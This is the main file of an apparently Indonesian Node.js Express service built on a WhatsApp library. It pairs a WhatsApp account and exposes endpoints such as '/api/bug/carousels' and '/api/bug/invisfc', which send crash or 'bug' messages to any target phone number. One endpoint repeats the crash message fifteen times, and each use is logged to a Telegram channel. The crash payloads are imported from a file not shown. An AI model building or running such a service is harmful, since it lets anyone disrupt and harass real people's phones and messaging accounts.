console.clear();  
require('./public/settings/config')
console.log('starting...');  
process.on("uncaughtException", console.error);  
  
const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap   
} = require("@whiskeysockets/baileys");  
  
const pino = require('pino');  
const readline = require("readline");  
const fs = require('fs');  
const express = require("express");  
const bodyParser = require('body-parser');  
const cors = require("cors");  
const path = require("path");    
  
const app = express();  
const PORT = process.env.PORT || 5036

const { carousels2, crashSql } = require('./public/service/bugs')
const { getRequest, sendTele } = require('./public/engine/telegram')

app.enable("trust proxy");  
app.set("json spaces", 2);  
app.use(cors());  
app.use(express.urlencoded({   
  extended: true   
}));  
app.use(express.json());  
app.use(express.static(path.join(__dirname, "public")));  
app.use(bodyParser.raw({   
  limit: '50mb',   
  type: '*/*'   
}));  

const { Boom } = require('@hapi/boom');
const usePairingCode = true;  

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,   
        output: process.stdout   
    })
    return new Promise((resolve) => {  
        rl.question(text, resolve)   
    });  
}

async function clientstart() {
	const { state, saveCreds } = await useMultiFileAuthState(`./session`)
    const { version, isLatest } = await fetchLatestBaileysVersion();
    const client = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });
      
     if (!client.authState.creds.registered) {
    console.log(`[!] Belum ada session! Pairing via POST /api/pair`)
  }
  
  
  app.get("/api/pair", async (req, res) => {
  const { number } = req.query;
  if (!number) return res.status(400).json({ message: "Nomor diperlukan!" });

  try {
    const code = await client.requestPairingCode(number, "KIUU1234");
    console.log("Pairing code:", code);
    res.json({ status: true, code });
  } catch (err) {
    console.error("Pairing gagal:", err.message);
    res.status(500).json({ status: false, message: "Gagal pairing", error: err.message });
  }
});

    app.get('/api/bug/carousels', async (req, res) => {
        const { target, fjids } = req.query;
        if (!target) return res.status(400).json({
            status: false, 
            message: "parameter target diperlukan"
        });
        if (!fjids) return res.status(400).json({
            status: false,  
            message: "parameter fjids diperlukan"
        });  
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await carousels2(client, cuki, fjids)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent carousels to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: Carousels2
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });  
    
    app.get('/api/bug/invisfc', async (req, res) => {
    const { target } = req.query;
    if (!target) return res.status(400).json({
        status: false,
        message: "parameter target diperlukan"
    });

    let bijipeler = target.replace(/[^0-9]/g, "");
    if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");

    let cuki = bijipeler + '@s.whatsapp.net';
    const info = await getRequest(req);
    res.json({
            status: true,
            creator: global.creator,
            result: "Berhasil dikirim 15 kali"
        });

    try {
        for (let i = 1; i <= 15; i++) {
            await crashSql(client, cuki);
            console.log(`(${i}/15) Berhasil kirim bug ke ${cuki}`);
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        const penis = `\n[API HIT]

Endpoint: Forcecall
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
Jumlah: 5x
Waktu: ${info.timestamp}

Log otomatis oleh sistem monitoring AmangXd API.`;
        sendTele(penis);

    } catch (error) {
        console.error(error);
        res.status(500).json({
            status: false,
            error: error.message
        });
    }
});
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/api/session/delete', async (req, res) => {
  try {
    const sessionPath = path.join(__dirname, 'session');
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
      console.log('[!] Session folder berhasil dihapus.');
      res.json({ status: true, message: "Session berhasil dihapus. Silakan pairing ulang." });
    } else {
      res.status(404).json({ status: false, message: "Session tidak ditemukan." });
    }
  } catch (err) {
    console.error('[!] Gagal menghapus session:', err.message);
    res.status(500).json({ status: false, message: "Gagal menghapus session.", error: err.message });
  }
});

app.get('/api/session-status', async (req, res) => {
  try {
    const sessionPath = './session/creds.json'
    if (fs.existsSync(sessionPath)) {
      const session = JSON.parse(fs.readFileSync(sessionPath))
      if (session && session.me) {
        return res.json({ status: true, connected: true, me: session.me });
      }
    }
    res.json({ status: true, connected: false });
  } catch (e) {
    res.status(500).json({ status: false, message: 'Gagal cek session', error: e.message });
  }
});
   
    client.ev.on('connection.update', (update) => {
        const { konek } = require('./public/connection/connect')
        konek({ 
            client, 
            update, 
            clientstart,
            DisconnectReason,
            Boom
        })  
    })  
    
    client.ev.on('creds.update', saveCreds);  
    return client;
}
      
clientstart()

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is in use. Trying another port...`);
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
    app.listen(newPort, () => {
      console.log(`Server is running on http://localhost:${newPort}`);
    });
  } else {
    console.error('An error occurred:', err.message);
  }
});

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {  
  require('fs').unwatchFile(file)  
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')  
  delete require.cache[file]  
  require(file)  
})  
